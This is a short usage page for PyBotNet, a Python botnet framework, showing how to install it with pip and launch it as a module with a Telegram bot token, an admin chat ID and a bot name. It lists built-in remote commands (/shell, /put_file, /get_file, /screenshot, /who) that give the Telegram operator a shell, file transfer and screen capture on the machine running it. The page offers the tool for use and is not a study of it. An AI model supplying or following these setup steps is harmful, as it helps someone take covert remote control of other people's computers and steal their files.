
We have seen before that we need some code to run pybotnet, but it is possible to run pybotnet as a module

All you have to do is, install PyBotNet on your system and enter the following command in your terminal:


‍‍
```console
pip3 install pybotnet -U --pre
```

!!! note
    Currently version 2 of the PyBotNet is pre-release

    `--pre`: 
        Include pre-release and development versions. By default, pip only finds stable versions.

    `-U`: make sure to upgrade framework to latest version.

---


```console
python3 -m pybotnet -t [TELEGRAM_TOKEN] -i [ADMIN_CHAT_ID] -n [BOT NAME]
```

somthing like:

```console
python3 -m pybotnet -t 5526760482:AAGweoNtLrHEsasxnklwhjms78ytPS3U8gEO6asc -i 5590231667 -n test
```

!!! note
    * `TELEGRAM_TOKEN`: You can use telegram `@botfather` to Create new telegram API Bot and get youre `TELEGRAM_TOKEN` 
    * `ADMIN_CHAT_ID`: Get it from @userinfobot telegram bot
    * PyBotNet include default scripts, like: `/shell`, `/put_file`, `/get_file`, `/screenshot`, `/who`, ...,
     you can send `/help` to your telegram bot and see more detail..